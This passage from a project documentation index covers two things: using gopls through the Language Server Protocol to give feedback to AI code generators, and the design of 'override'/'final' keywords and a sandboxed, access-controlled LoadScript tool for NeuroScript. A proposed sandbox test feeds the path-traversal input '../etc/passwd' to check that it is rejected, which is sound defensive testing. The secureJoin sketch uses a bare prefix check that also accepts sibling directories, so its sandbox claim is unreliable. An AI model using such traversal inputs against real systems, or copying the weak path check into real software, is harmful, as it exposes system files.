by the <code>modernize</code> analyzer[^6].</p> <p>AI Action: The AI should treat analyzer diagnostics not just as errors but as suggestions for improving code quality, readability, and adherence to Go conventions. It can automatically apply formatting edits received from <code>gopls</code>. It can also evaluate and apply suggested code actions that refactor the code towards better style or efficiency.</p>"},{"location":"project/Version_05/gopls_integration/#45-refactoring-and-code-modification","title":"4.5. Refactoring and Code Modification","text":"<p>Mechanism: For systematic changes, the AI can leverage <code>gopls</code>'s refactoring capabilities. It can initiate a safe rename operation using <code>textDocument/rename</code>[^6]. It can discover and potentially apply refactorings like \"Extract function,\" \"Extract variable,\" or \"Inline call\" offered via <code>textDocument/codeAction</code> requests[^6]. Before making significant changes, it can use <code>textDocument/references</code> to find all usages of a symbol and assess the potential impact[^6].</p> <p>AI Action: The AI can perform automated refactoring tasks based on higher-level objectives (e.g., \"improve modularity by extracting this block into a function,\" \"rename this variable for clarity\"). Using <code>gopls</code> for these operations ensures that the transformations are applied correctly across the relevant scope, maintaining the semantic integrity of the code.</p>"},{"location":"project/Version_05/gopls_integration/#46-table-gopls-lsp-features-for-ai-feedback","title":"4.6. Table: gopls LSP Features for AI Feedback","text":"<p>The following table summarizes the mapping between key LSP methods implemented by <code>gopls</code> and their potential use cases as feedback mechanisms for an AI system.</p> LSP Method gopls Feature Category [^6] Information Provided Potential AI Use Case Relevant gopls Settings [^16] <code>textDocument/publishDiagnostics</code> Diagnostics Errors, warnings, linter issues (location, message, severity, code, potential fixes) Error detection, correctness validation, code quality improvement, style checking <code>analyses</code>, <code>staticcheck</code>, <code>vulncheck</code>, <code>diagnostic</code>, <code>annotations</code>, <code>diagnosticsTrigger</code> <code>textDocument/completion</code> Completion Context-aware suggestions (identifiers, keywords, snippets, imports, function calls) Guided code generation, syntax validation, exploring valid next steps <code>ui.completion</code>, <code>completeFunctionCalls</code> <code>textDocument/hover</code> Passive (Hover) Symbol type, documentation [^24], signature Type verification, context understanding, semantic guidance <code>ui.documentation.hoverKind</code> <code>textDocument/definition</code> Navigation Location of symbol definition Understanding code structure, dependency analysis, type exploration N/A <code>textDocument/typeDefinition</code> Navigation Location of symbol's type definition Precise type understanding, navigating type hierarchies N/A <code>textDocument/references</code> Navigation List of all locations where a symbol is referenced Impact analysis before changes, understanding symbol usage N/A <code>textDocument/codeAction</code> Code Transformation Suggested fixes for diagnostics, refactoring options (extract, inline, etc.) Automated error correction, code refactoring, applying style/quality improvements <code>ui.codelenses</code> (may trigger actions), <code>analyses</code> (fixable diagnostics) <code>textDocument/formatting</code> Code Transformation Text edits to format code according to Go standards Ensuring consistent code style, readability improvement <code>ui.formatting.gofumpt</code>, <code>local</code> (import organization) <code>textDocument/rename</code> Code Transformation Workspace edits to safely rename a symbol Automated refactoring for clarity or consistency N/A <code>textDocument/signatureHelp</code> Passive (Signature Help) Parameter information for function calls Constructing valid function calls, understanding parameter requirements N/A <code>textDocument/implementation</code> Navigation Locations of types implementing an interface [^26] Understanding interface usage, navigating implementations N/A"},{"location":"project/Version_05/gopls_integration/#5-integration-challenges-and-considerations","title":"5. Integration Challenges and Considerations","text":"<p>While using <code>gopls</code> via LSP offers significant potential for providing feedback to AI systems, several challenges and considerations must be addressed during integration.</p>"},{"location":"project/Version_05/gopls_integration/#51-interaction-model-latency","title":"5.1. Interaction Model &amp; Latency","text":"<p>A primary challenge lies in reconciling the potentially high-frequency interaction patterns of an AI system with the performance characteristics and caching mechanisms of <code>gopls</code>, which are primarily tuned for human interaction speeds[^9]. An AI might generate code or request feedback far more rapidly than a human types. Naively sending <code>didChange</code> notifications and requesting diagnostics or completions after every small change (e.g., single token) could overwhelm <code>gopls</code>, leading to excessive cache invalidation, high CPU/memory usage, and significant latency, potentially negating the benefits of using the server[^15].</p> <p>Developing an appropriate interaction model is crucial. Possible strategies include:</p> <ul> <li>Batching Changes: Accumulating several small code modifications before sending a single <code>didChange</code> notification.</li> <li>Checkpointing: Requesting analysis (e.g., diagnostics) only at logical checkpoints in the generation process (e.g., after generating a complete function or block), rather than continuously.</li> <li>Throttling Requests: Limiting the rate at which requests like completion or hover are sent.</li> <li>Configuration Tuning: Adjusting <code>gopls</code> settings, such as setting <code>diagnosticsTrigger</code> to \"Save\" instead of \"Edit\" [^16], although this might delay feedback.</li> </ul> <p>The discrepancy between AI operational speeds and <code>gopls</code>'s design assumptions suggests the need for an intermediate abstraction layer. Such a layer, sitting between the core AI model and the <code>gopls</code> process, could manage the LSP communication complexities. It would be responsible for translating high-level AI actions (e.g., \"generate a function that does X\") into an optimized sequence of LSP notifications and requests, batching changes, parsing responses, managing document state (versions), handling asynchronous notifications like diagnostics, and translating the potentially verbose LSP feedback into a format more readily consumable by the AI's decision-making logic. This intermediary would buffer the AI from the raw LSP interaction, potentially improving overall system performance and robustness.</p>"},{"location":"project/Version_05/gopls_integration/#52-parsing-and-interpreting-lsp-responses","title":"5.2. Parsing and Interpreting LSP Responses","text":"<p>LSP communication uses JSON-RPC[^1]. The AI client system (or the abstraction layer) must implement robust parsing for these JSON messages. Furthermore, it needs logic to correctly interpret the structure and semantics of various LSP responses and notifications, which can be complex[^12]. For example, diagnostics are arrays of objects with specific fields (range, severity, message, code), completion results are lists with various properties (label, kind, detail, documentation, textEdit), and code actions can involve complex workspace edits. Errors in parsing or interpretation could lead to incorrect feedback being presented to the AI or system instability. Utilizing existing, well-tested LSP client libraries can mitigate this challenge, but careful handling of message structures according to the LSP specification is essential[^12]. Attention must also be paid to any <code>gopls</code>-specific extensions or conventions, such as its non-standard commands invoked via <code>workspace/executeCommand</code>[^18].</p>"},{"location":"project/Version_05/gopls_integration/#53-state-management","title":"5.3. State Management","text":"<p>LSP interactions are inherently stateful, particularly concerning the content and versioning of documents open on the server. The client must meticulously track the state of the documents it manages, sending accurate version numbers with <code>textDocument/didChange</code> notifications to ensure the server operates on the correct document state. Any discrepancy can lead to incorrect analysis or errors. <code>gopls</code> itself maintains complex internal state through its Session, View, and Snapshot mechanisms to manage workspace information, build configurations, and file contents efficiently[^9]. The AI client system must reliably manage its view of the workspace state to remain synchronized with the server.</p>"},{"location":"project/Version_05/gopls_integration/#54-handling-gopls-updates-and-evolution","title":"5.4. Handling gopls Updates and Evolution","text":"<p>Both <code>gopls</code> and the Language Server Protocol itself are under active development and evolve over time[^2]. New features are added, existing behaviors might be refined, configuration options can change, and protocol versions are updated. Furthermore, <code>gopls</code> has specific policies regarding supported Go language versions[^10]. An AI integration built against a specific version of <code>gopls</code> might encounter issues or fail to leverage new capabilities when <code>gopls</code> is updated.</p> <p>Mitigation strategies include:</p> <ul> <li>Targeting stable <code>gopls</code> releases[^10].</li> <li>Utilizing the LSP capabilities negotiation during the <code>initialize</code> handshake to dynamically adapt to the features supported by the specific <code>gopls</code> instance[^12].</li> <li>Implementing robust error handling to gracefully manage unexpected responses or protocol deviations.</li> <li>Monitoring <code>gopls</code> release notes for breaking changes or new features[^8].</li> <li>Ensuring the build environment and target Go code versions align with <code>gopls</code>'s support policy[^10].</li> </ul>"},{"location":"project/Version_05/gopls_integration/#55-scalability-and-resource-consumption","title":"5.5. Scalability and Resource Consumption","text":"<p>Running <code>gopls</code> requires computational resources, primarily CPU for analysis and memory for caching parsed and type-checked code[^15]. While optimized for typical single-developer use, deploying <code>gopls</code> at scale\u2014for instance, serving many concurrent AI agents or analyzing extremely large codebases (\"corporate mono-repo\" scale mentioned in [^15])\u2014could lead to significant resource consumption. Thorough testing is needed to understand the resource footprint under realistic AI workloads. Strategies for managing scalability might include optimizing <code>gopls</code> configuration to disable unused features[^16], exploring possibilities for sharing <code>gopls</code> instances across multiple AI agents (if state isolation can be managed), or potentially contributing performance optimizations back to the <code>gopls</code> project[^7].</p>"},{"location":"project/Version_05/gopls_integration/#6-conclusion-and-future-work","title":"6. Conclusion and Future Work","text":""},{"location":"project/Version_05/gopls_integration/#61-summary-of-findings","title":"6.1. Summary of Findings","text":"<p>The analysis indicates that utilizing <code>gopls</code> as a source of information and feedback for AI systems working with Go code is highly feasible and offers substantial benefits. <code>gopls</code>, through the standardized Language Server Protocol, provides a rich and diverse set of feedback mechanisms that go far beyond basic syntax checking. These include detailed diagnostics from compilation and static analysis, context-aware code completion, type and documentation information, and support for automated refactoring.</p> <p>Key benefits stem from leveraging a mature, actively maintained tool built by the Go team, accessing deep language understanding without reimplementing complex analysis logic, and the potential for adapting the AI client to other languages via LSP's standardized interface.</p> <p>However, successful integration hinges on addressing several challenges. The most significant is managing the interaction model to align the AI's potentially high-frequency operations with <code>gopls</code>'s performance characteristics, which are optimized for human interaction speeds. Other critical considerations include the complexity of parsing and interpreting LSP messages, meticulous state management, adapting to the ongoing evolution of gopls and LSP, and potential scalability and resource consumption issues in large-scale deployments.</p>"},{"location":"project/Version_05/gopls_integration/#62-recommendations","title":"6.2. Recommendations","text":"<p>Based on these findings, the following recommendations are proposed:</p> <ul> <li>Proceed with Integration, Carefully: Using <code>gopls</code> for AI feedback is recommended due to its rich capabilities, but the integration requires careful design, particularly concerning the interaction model.</li> <li>Develop an Abstraction Layer: Implementing an intermediate layer between the AI model and the <code>gopls</code> process is strongly advised. This layer should manage LSP communication, state tracking, response parsing, asynchronous event handling, and potentially optimize the interaction flow (e.g., request batching/throttling).</li> <li>Prioritize Performance Testing: Conduct empirical performance testing early and continuously, using realistic AI workloads to measure <code>gopls</code> latency and resource consumption and to validate the chosen interaction model.</li> <li>Adopt Incremental Feature Integration: Begin by integrating core feedback mechanisms like diagnostics (<code>publishDiagnostics</code>), completion (<code>completion</code>), and hover (<code>hover</code>). Progressively incorporate more advanced features like code actions (<code>codeAction</code>) and refactoring (<code>rename</code>) as the integration matures.</li> <li>Leverage Configuration: Actively utilize <code>gopls</code> configuration settings to tailor its behavior for the AI client, disabling unnecessary UI features and enabling relevant analyses.</li> </ul>"},{"location":"project/Version_05/gopls_integration/#63-future-work","title":"6.3. Future Work","text":"<p>Further research and development could explore several avenues:</p> <ul> <li>Conducting detailed empirical studies to quantify <code>gopls</code> latency and resource usage under various simulated AI interaction patterns (e.g., different generation speeds, edit sizes, request frequencies).</li> <li>Designing, implementing, and evaluating different architectures for the AI-<code>gopls</code> abstraction layer to identify optimal strategies for performance and robustness.</li> <li>Investigating the utility of more advanced <code>gopls</code> features for AI, such as using call hierarchy information [^6] for deeper program understanding or leveraging vulnerability scanning results [^16] for security-aware code generation.</li> <li>Exploring potential enhancements or specific configurations within <code>gopls</code> itself that could further benefit AI clients, potentially through contributions to the open-source project [^7].</li> <li>Performing comparative studies evaluating the effectiveness of the <code>gopls</code>/ LSP approach against alternative feedback mechanisms for AI code generation (e.g., direct compiler integration, custom static analyzers).</li> </ul> <p>By addressing the identified challenges and pursuing these future directions, the powerful analysis capabilities of <code>gopls</code> can be effectively harnessed to significantly improve the quality, correctness, and utility of AI systems involved in Go software development.</p>"},{"location":"project/Version_05/gopls_integration/#7-references","title":"7. References","text":"<p>[^1]: Language Server Protocol - Wikipedia, accessed April 30, 2025, https://en.wikipedia.org/wiki/Language_Server_Protocol [^2]: Official page for Language Server Protocol - Microsoft Open Source, accessed April 30, 2025, https://microsoft.github.io/language-server-protocol/ [^3]: Language Server Protocol Overview - Visual Studio (Windows) | Microsoft Learn, accessed April 30, 2025, https://learn.microsoft.com/en-us/visualstudio/extensibility/language-server-protocol?view=vs-2022 [^4]: Language Server, accessed April 30, 2025, https://langserver.org/ [^5]: The Specification Language Server Protocol: A Proposal for Standardised LSP Extensions, accessed April 30, 2025, https://cister-labs.pt/f-ide2021/images/preprints/F-IDE_2021_paper_3.pdf [^6]: tools/gopls/doc/features/README.md at master \u00b7 golang/tools - GitHub, accessed April 30, 2025, https://github.com/golang/tools/blob/master/gopls/doc/features/README.md [^7]: gopls documentation, accessed April 30, 2025, https://go.googlesource.com/tools/+/refs/heads/release-branch.go1.14/gopls/README.md [^8]: docs/gopls.md \u00b7 v0.17.0-rc.3 \u00b7 Chambon Laurent / vscode-go - GitLab, accessed April 30, 2025, https://gitub.u-bordeaux.fr/lchamb101p/vscode-go/-/blob/v0.17.0-rc.3/docs/gopls.md [^9]: Gopls | Terminal, command line, code, accessed April 30, 2025, https://www.getman.io/posts/gopls/ [^10]: tools/gopls/README.md at master \u00b7 golang/tools - GitHub, accessed April 30, 2025, https://github.com/golang/tools/blob/master/gopls/README.md [^11]: microsoft/language-server-protocol - GitHub, accessed April 30, 2025, https://github.com/microsoft/language-server-protocol [^12]: Language Server Protocol Specification - 3.17 - Microsoft Open Source, accessed April 30, 2025, https://microsoft.github.io/language-server-protocol/specifications/lsp/3.17/specification/ [^13]: language-server-protocol/_specifications/lsp/3.18/specification.md at gh-pages \u00b7 microsoft ... - GitHub, accessed April 30, 2025, https://github.com/microsoft/language-server-protocol/blob/gh-pages/_specifications/lsp/3.18/specification.md [^14]: Language Server Protocol : r/Compilers - Reddit, accessed April 30, 2025, https://www.reddit.com/r/Compilers/comments/w4krd4/language_server_protocol/ [^15]: gopls design documentation, accessed April 30, 2025, https://go.googlesource.com/tools/+/refs/heads/master/gopls/doc/design/design.md [^16]: tools/gopls/doc/settings.md at master \u00b7 golang/tools - GitHub, accessed April 30, 2025, https://github.com/golang/tools/blob/master/gopls/doc/settings.md [^17]: Go in Visual Studio Code, accessed April 30, 2025, https://code.visualstudio.com/docs/languages/go [^18]: tools/gopls/doc/design/implementation.md at master - GitHub, accessed April 30, 2025, https://github.com/golang/tools/blob/master/gopls/doc/design/implementation.md [^19]: gopls implementation documentation, accessed April 30, 2025, https://go.googlesource.com/tools/+/refs/tags/v0.5.0/gopls/doc/design/implementation.md [^20]: [tools] gopls/internal: update LSP support - Google Groups, accessed April 30, 2025, https://groups.google.com/g/golang-codereviews/c/X7E8tnwfdjI [^21]: server package - golang.org/x/tools/gopls/internal/server - Go Packages, accessed April 30, 2025, https://pkg.go.dev/golang.org/x/tools/gopls/internal/server [^22]: lsp package - golang.org/x/tools/gopls/internal/lsp - Go Packages, accessed April 30, 2025, https://pkg.go.dev/golang.org/x/tools/gopls/internal/lsp [^23]: protocol package - golang.org/x/tools/gopls/internal/protocol - Go Packages, accessed April 30, 2025, https://pkg.go.dev/golang.org/x/tools/gopls/internal/protocol [^24]: Go Doc Comments - The Go Programming Language, accessed April 30, 2025, https://tip.golang.org/doc/comment [^25]: gopls command - golang.org/x/tools/gopls - Go Packages, accessed April 30, 2025, https://pkg.go.dev/golang.org/x/tools/gopls [^26]: How to find interface implementations with <code>gopls</code> and <code>lsp-mode</code>?, accessed April 30, 2025, https://emacs.stackexchange.com/questions/74048/how-to-find-interface-implementations-with-gopls-and-lsp-mode [^27]: (PDF) The Specification Language Server Protocol: A Proposal for Standardised LSP Extensions - ResearchGate, accessed April 30, 2025, https://www.researchgate.net/publication/353767025_The_Specification_Language_Server_Protocol_A_Proposal_for_Standardised_LSP_Extensions [^28]: How to create a language server (LSP) in Go? : r/golang - Reddit, accessed April 30, 2025, https://www.reddit.com/r/golang/comments/w8tyrc/how_to_create_a_language_server_lsp_in_go/</p>"},{"location":"project/Version_05/persisting_fns/","title":"Persisting Fns within session","text":"<p>An interesting aspect of ns design has arisen. What things should persist within the interpreter between file loads? We wish funcs and event handlers (probably) to persist, so that a fn call another defined in a different file (maybe), ditto event handlers; but we don't want error handlers in one fn to last into the next (as currently happens). How do you think it should work?</p>"},{"location":"project/Version_05/persisting_fns/#redefining-a-function-inside-the-same-interpreter-session","title":"Redefining a function inside the same interpreter session","text":"Scenario Recommended default Why How to opt-in/out Accidental second definition (same name, same namespace, no qualifier) Hard error \u2192 fail <code>LoadScript()</code> 90 % of the time it\u2019s a bug; prevents \u201cmystery behaviour changes\u201d \u2015 Intentional hot-reload / patch Allow explicit replacement with <code>override</code> keyword Keeps live-coding workflow but forces you to acknowledge you are stomping on the old code <code>override func main() { \u2026 }</code> Side-by-side versions (e.g. experimental algo) Require a new namespace or qualifier Avoids name clashes while still allowing both implementations <code>namespace \"v2\"</code> or <code>func main_v2() { \u2026 }</code> Auto-refresh during <code>watch</code> mode (dev convenience flag) \u201cLast-loaded wins\u201d with warning Speeds up iterative editing; you already expect churn CLI flag <code>--reload=warn</code>"},{"location":"project/Version_05/persisting_fns/#1-interpreter-logic-go-sketch","title":"1 \u2014 Interpreter logic (Go sketch)","text":"<pre><code>func (s *RuntimeSession) registerProc(p *Procedure) error {\n    qn := p.QualifiedName()     // e.g. \"main\" or \"mylib/math/gcd\"\n    old, exists := s.procTable[qn]\n\n    switch {\n    case !exists:\n        s.procTable[qn] = p\n        return nil\n\n    case p.Override:           // parsed from `override func`\n        s.procTable[qn] = p    // replace silently\n        log.Warnf(\"procedure %s overridden (previous defined at %s)\", qn, old.DeclPos)\n        return nil\n\n    case s.opts.DevReload:     // watch-mode convenience\n        s.procTable[qn] = p\n        log.Warnf(\"procedure %s replaced in dev-reload mode\", qn)\n        return nil\n\n    default:\n        return fmt.Errorf(\"duplicate procedure %q (first defined at %s)\", qn, old.DeclPos)\n    }\n}\n</code></pre> <p>Event handlers follow a different rule: duplicates are allowed and appended, unless the handler itself is flagged <code>oneshot</code> or <code>override</code>.</p>"},{"location":"project/Version_05/persisting_fns/#2-grammar-addition","title":"2 \u2014 Grammar addition","text":"<pre><code>FuncDecl  ::= ( \"func\" | \"override\" \"func\" ) Identifier \"(\" ParamList? \")\" Block\n</code></pre> <ul> <li>Parsing sets <code>Procedure.Override = true</code> when the keyword is present.</li> </ul>"},{"location":"project/Version_05/persisting_fns/#3-workflow-examples","title":"3 \u2014 Workflow examples","text":"<pre><code># file: app.ns\nfunc main() {\n    print(\"v1\")\n}\n</code></pre> <p>Later, during the same REPL session:</p> <pre><code># file: app_hotfix.ns\noverride func main() {   # \u2190 explicit\n    print(\"v2 hot-patch\")\n}\n</code></pre> <p>Load succeeds; subsequent <code>run main()</code> executes the new body. If you forgot <code>override</code>, <code>LoadScript()</code> raises <code>duplicate procedure \"main\"</code> and the original version remains intact.</p>"},{"location":"project/Version_05/persisting_fns/#4-testing-it","title":"4 \u2014 Testing it","text":"<ul> <li> <p><code>TestRedeclareWithoutOverrideFails</code></p> </li> <li> <p>Load file A with <code>func main()</code>.</p> </li> <li>Load file B with another <code>func main()</code>.</li> <li> <p>Expect error.</p> </li> <li> <p><code>TestOverrideSucceeds</code></p> </li> <li> <p>Same as above but B uses <code>override func main()</code>.</p> </li> <li> <p>Call <code>main()</code>, assert output matches B\u2019s body.</p> </li> <li> <p><code>TestDevReloadFlag</code></p> </li> <li> <p>Start session with <code>DevReload=true</code>.</p> </li> <li>Re-load same function repeatedly; ensure last one runs and only warnings are logged.</li> </ul>"},{"location":"project/Version_05/persisting_fns/#why-this-policy-is-sane","title":"Why this policy is sane","text":"<ul> <li>Safety first\u2003Silent shadowing is a nightmare to debug. The error-by-default rule stops that.</li> <li>Zero friction hot-reload\u2003One extra keyword (<code>override</code>) is trivial, and you keep deterministic behaviour in prod.</li> <li>Fits namespacing\u2003If you already use <code>namespace</code>, clashing across files in the same namespace is almost certainly unintended.</li> <li>Extensible\u2003You can add finer-grained controls later (<code>deprecated</code>, <code>version \"2.1\"</code> tags, etc.) without breaking the core rule that only an explicit act can mutate compiled artefacts in place.</li> </ul> <p>Implement it once, and you\u2019ll never wonder again which <code>main()</code> you\u2019re actually running.</p> <p>Below is a straightforward extension of the \u201coverride / duplicate\u201d rules we just discussed that lets you lock down critical procedures or handlers so they cannot be replaced later in the session\u2014unless a root-level authority explicitly unpins them.</p>"},{"location":"project/Version_05/persisting_fns/#1-proposed-surface-syntax","title":"1 \u2014 Proposed surface syntax","text":"<pre><code># declare and lock a procedure\npin func auth.verifyToken(token string) returns bool {\n    ...\n}\n\n# shorter alias if you dislike \u201cpin\u201d\nfinal func main() { ... }\n\n# event-handler variant\npin on event \"system.shutdown\" { ... }\n</code></pre>"},{"location":"project/Version_05/persisting_fns/#keyword-summary","title":"Keyword summary","text":"Keyword Meaning <code>func</code> Normal declaration; duplicate = error unless <code>--reload</code> flag is on <code>override</code> Replace an existing procedure only if it is not pinned <code>pin</code> / <code>final</code> Declare procedure or handler immutable for the lifetime of the session <code>unpin</code> (opt) Privileged declaration that removes the protection (see \u00a74)"},{"location":"project/Version_05/persisting_fns/#2-interpreter-rule-set","title":"2 \u2014 Interpreter rule set","text":"<ol> <li> <p>First declaration If keyword is <code>pin</code> (or <code>final</code>) \u2192 store <code>Procedure.Pinned = true</code> in the proc table.</p> </li> <li> <p>On subsequent registration attempts</p> </li> </ol> <pre><code>switch {\ncase old.Pinned &amp;&amp; !new.Unpin:\n    // Absolutely deny replacement\n    return fmt.Errorf(\"procedure %q is pinned and cannot be overridden\", qn)\n\ncase old.Pinned &amp;&amp; new.Unpin:\n    // Allow but log high-priority audit\n    s.procTable[qn] = new\n    log.Warnf(\"procedure %q UNPINNED by %s\", qn, callerIdentity)\n\ncase !old.Pinned &amp;&amp; new.Override:\n    // Standard hot-reload\n    s.procTable[qn] = new\n\ndefault:\n    return fmt.Errorf(\"duplicate procedure %q (existing defined at %s)\", qn, old.DeclPos)\n}\n</code></pre> <ol> <li>Pinned status is sticky\u2014once unset with <code>unpin</code>, a later <code>pin</code> can lock it again (useful for patch-then-re-seal workflows).</li> </ol>"},{"location":"project/Version_05/persisting_fns/#3-ebnf-additions","title":"3 \u2014 EBNF additions","text":"<pre><code>FuncDecl      ::= ( \"func\" | \"override\" \"func\" | \"pin\" \"func\" | \"final\" \"func\" | \"unpin\" \"func\" ) Identifier \"(\" ParamList? \")\" Block\nEventHandler  ::= ( \"on\" | \"pin\" \"on\" | \"unpin\" \"on\" ) \"event\" StringLiteral Block\n</code></pre> <p>Parser sets:</p> <pre><code>Procedure.Pinned   = hasToken(\"pin\") || hasToken(\"final\")\nProcedure.Unpin    = hasToken(\"unpin\")\nProcedure.Override = hasToken(\"override\")\n</code></pre>"},{"location":"project/Version_05/persisting_fns/#4-security-governance-knobs","title":"4 \u2014 Security / governance knobs","text":"<ul> <li> <p>Require capability to unpin   \u2013 Interpreter option <code>SessionOptions.AllowUnpin = false</code> (prod default).   \u2013 FDM-style ACL: only code loaded from a trusted namespace or signed file can use <code>unpin</code>.</p> </li> <li> <p>Audit trail   Record <code>(timestamp, user, oldHash, newHash)</code> whenever an <code>unpin</code> or an <code>override</code> happens. Persist to the same append-only log you\u2019re already using for event telemetry.</p> </li> <li> <p>Dev REPL convenience   A <code>--dev</code> flag can relax rules: <code>pin</code> is honoured, but <code>override</code> of a pinned func just emits a warning. Never enable this outside development.</p> </li> </ul>"},{"location":"project/Version_05/persisting_fns/#5-edge-case-resolution","title":"5 \u2014 Edge-case resolution","text":"Situation Expected outcome Load script A \u2192 <code>pin func main()</code> OK, <code>main</code> pinned Load script B \u2192 <code>override func main()</code> Error (pinned) Load script C \u2192 <code>unpin func main()</code> Allowed only if <code>AllowUnpin=true</code>; audit event Load script D \u2192 <code>func main()</code> Replaces previous body; now unpinned unless D uses <code>pin</code> again Load script E \u2192 <code>pin func main()</code> Re-locks with new body"},{"location":"project/Version_05/persisting_fns/#6-minimal-tests-to-add","title":"6 \u2014 Minimal tests to add","text":"<pre><code>TestPinBlocksOverride()\nTestUnpinAllowsReplacement()\nTestPinnedStatusStickyAcrossReload()\nTestUnprivilegedUnpinDenied()\n</code></pre> <p>I like final I think :) Thinking we should also make LoadScript a tool so it can be allow/deny listed, and constrain it to subdirs of a particular dir</p>"},{"location":"project/Version_05/persisting_fns/#why-this-is-worth-the-tiny-additional-complexity","title":"Why this is worth the (tiny) additional complexity","text":"<ul> <li>Stops malicious or sloppy code from silently hijacking <code>auth.*</code>, <code>db.connect</code>, <code>main</code>, etc.</li> <li>Keeps hot-reload ergonomic\u2014you only add <code>pin</code> where you actually care.</li> <li>Matches real-world policies (think <code>final</code> classes in Java or <code>sealed</code> in C#) but fits the dynamic-reloading ethos of NeuroScript.</li> </ul> <p>If you wire the capability check into the same ACL mechanism you\u2019re already designing for FDM overlays, you\u2019ll have a consistent story for who is allowed to mutate what at runtime.</p> <p>Below is a concrete design that folds your <code>final</code> keyword into the language and turns <code>LoadScript</code> into a first-class tool that can be allow/deny-listed and sandboxed to a directory tree.</p>"},{"location":"project/Version_05/persisting_fns/#1-final-keyword-locking-down-artefacts","title":"1\u2002<code>final</code> keyword \u2014 locking down artefacts","text":"<ul> <li>Surface grammar</li> </ul> <pre><code>ProcDecl       ::= ( \"func\" | \"override\" \"func\" | \"final\" \"func\" ) Ident \"(\" \u2026 \")\" Block\nEventHandler   ::= ( \"on\" | \"final\" \"on\" ) \"event\" StringLit Block\n</code></pre> <ul> <li><code>final func \u2026</code> or <code>final on event \u2026</code>     \u2013 Registers artefact with <code>Pinned=true</code>     \u2013 Subsequent attempts to redefine always error (even with <code>override</code>)</li> <li>Ordinary <code>func</code> remains replaceable (with explicit <code>override</code>)</li> <li>No <code>unpin</code>. If you truly have to patch a final artefact, restart the interpreter or load a fresh session; keeps the rule simple and audit-friendly.</li> </ul>"},{"location":"project/Version_05/persisting_fns/#2-promote-loadscript-to-a-tool","title":"2\u2002Promote LoadScript to a tool","text":""},{"location":"project/Version_05/persisting_fns/#21-tool-signature-and-metadata","title":"2.1 Tool signature and metadata","text":"<pre><code>tool system.loadScript\n    args:\n        path string         # relative or absolute\n        override bool = false   # allow non-final overrides?\n    returns void\n    sideeffects filesystem, runtime   # so the auditor knows\n    description \"\"\"\n    Parse and register a NeuroScript file. Fails if file attempts to\n    redefine a `final` artefact or if the path escapes the sandbox root.\n    \"\"\"\n</code></pre>"},{"location":"project/Version_05/persisting_fns/#22-sandbox-acl","title":"2.2 Sandbox &amp; ACL","text":"<ol> <li> <p>Sandbox root \u2014 interpreter option <code>SessionOptions.ScriptRoot</code> All paths are resolved to <code>absPath := filepath.Clean(root + \"/\" + path)</code>.    Reject if <code>!strings.HasPrefix(absPath, root)</code> \u2192 prevents <code>../../</code>.</p> </li> <li> <p>Per-tool allow/deny list (same structure you already use for FDM tools):</p> </li> </ol> <pre><code>tools:\n  system.loadScript:\n    allow:\n      - \"deployBot\"            # agent IDs or group names\n    deny:\n      - \"guest\"\n</code></pre> <p>The interpreter consults this before executing the tool; failure = runtime error.</p> <ol> <li>Runtime override flag</li> </ol> <p>If <code>override=true</code> is passed, <code>loadScript</code> behaves as though the file\u2019s    declarations all had the <code>override</code> prefix but still respects <code>final</code>.</p>"},{"location":"project/Version_05/persisting_fns/#3-go-implementation-sketch","title":"3\u2002Go implementation sketch","text":"<pre><code>type LoadScriptTool struct {\n    Session *RuntimeSession\n    Root    string            // sandbox root\n}\n\nfunc (t *LoadScriptTool) Invoke(ctx *CallCtx, args []Value) (Value, error) {\n    path     := string(args[0].(StringValue))\n    override := bool(args[1].(BoolValue))\n\n    abs, err := secureJoin(t.Root, path)\n    if err != nil { return nil, err }\n\n    // Parse / build AST\n    ast, err := parseAndBuild(abs)\n    if err != nil { return nil, err }\n\n    // Register artefacts. Honour final / override.\n    for _, proc := range ast.Procedures {\n        if override { proc.Override = true }\n        if err := t.Session.RegisterProc(proc); err != nil { return nil, err }\n    }\n    for _, ev := range ast.EventHandlers {\n        if override { ev.Override = true }\n        if err := t.Session.RegisterHandler(ev); err != nil { return nil, err }\n    }\n    return NilValue{}, nil\n}\n\nfunc secureJoin(root, p string) (string, error) {\n    abs := filepath.Clean(filepath.Join(root, p))\n    if !strings.HasPrefix(abs, root) {\n        return \"\", fmt.Errorf(\"path escapes sandbox\")\n    }\n    return abs, nil\n}\n</code></pre> <ul> <li>Register the tool in the interpreter\u2019s tool table under name   <code>\"system.loadScript\"</code>, with a <code>ToolImplementation</code> wrapping <code>LoadScriptTool</code>.</li> </ul>"},{"location":"project/Version_05/persisting_fns/#4-recommended-policy-flow","title":"4\u2002Recommended policy flow","text":"Phase Action Startup Admin script calls <code>system.loadScript(\"lib/core.ns\")</code> to prime standard library. Normal operation Only agents in the Deployers group have <code>\"system.loadScript\"</code> in their allow-list. Hot patch Deployer uploads <code>patch.ns</code> with <code>override func ...</code>; calls tool with <code>override=true</code>. Fails if patch touches anything declared <code>final</code>. Attack attempt Malicious agent tries to redefine <code>final func auth.verifyToken</code>. Registration blocked with clear audit log entry."},{"location":"project/Version_05/persisting_fns/#5-tests-you-should-add","title":"5\u2002Tests you should add","text":"<ul> <li><code>TestFinalBlocksOverride</code> \u2014 load file A with <code>final func main()</code>, then load B with <code>override func main()</code>, expect error.</li> <li><code>TestLoadScriptSandbox</code> \u2014 give root <code>/tmp/scripts</code>, attempt <code>../etc/passwd</code>, expect error.</li> <li><code>TestLoadScriptACL</code> \u2014 run under identity not on allow-list, expect \u201ctool not permitted\u201d.</li> <li><code>TestOverrideFlag</code> \u2014 file without <code>override</code> keyword, but tool invoked with <code>override=true</code>; should replace non-final function.</li> </ul>"},{"location":"project/Version_05/persisting_fns/#why-this-design-is-robust","title":"Why this design is robust","text":"<ul> <li><code>final</code> is a one-way door \u2014 prevents supply-chain or live-coding accidents from stomping critical code.</li> <li>Tool-based loading centralises policy: same ACL mechanism you already trust for external calls.</li> <li>Directory sandbox kills path-traversal tricks.</li> <li>Small cognitive footprint: only two new concepts (<code>final</code>, <code>system.loadScript</code>), both intuitive.</li> </ul> <p>You now have hot-reload convenience and a solid security boundary\u2014without sprawling rules you\u2019ll forget in six months.</p> <p>Very nice. So you approve overall?</p> <p>Overall, yes\u2014I think this is a solid, internally coherent design. It strikes a good balance between developer ergonomics (easy hot-reload) and operational safety (clear rules, hard stops when you need them). A few final-round observations before you lock it in:</p>"},{"location":"project/Version_05/persisting_fns/#what-works-well","title":"What works well","text":"<ol> <li> <p>Single-direction guarantees (<code>final</code>) One\u2010way doors make mental models simple. Developers know that declaring something <code>final</code> really means \u201cimmutable for this session.\u201d</p> </li> <li> <p>Explicit intent (<code>override</code> flag or keyword)    Shadowing is never 